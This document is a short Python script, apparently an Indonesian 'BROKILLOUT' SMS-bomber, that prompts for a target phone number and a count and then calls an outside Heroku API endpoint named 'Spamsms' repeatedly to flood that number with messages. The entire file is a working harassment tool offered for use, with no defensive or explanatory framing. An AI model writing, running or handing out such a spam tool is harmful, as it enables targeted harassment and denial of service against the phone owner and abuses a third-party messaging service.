import requests, os

def logo():
     print("""

            [ BROKILLOUT ]


""")


def menu() :
        os.system('clear')
        logo()
        print("\nMasukan nomor di awali (8xxx)")
        nomor = input("nomor tujuan :0")
        jum = int(input("jumlah:"))
        for i in range(jum):
         req = requests.get ("https://ainxbot-sms.herokuapp.com/api/Spamsms",params={"phone":nomor}).text

        if 'terkirim' in req:
             print("\nSpam terkirim")
        else :
          print("\nSpam Gagal")
          os.system ('clear')


menu()
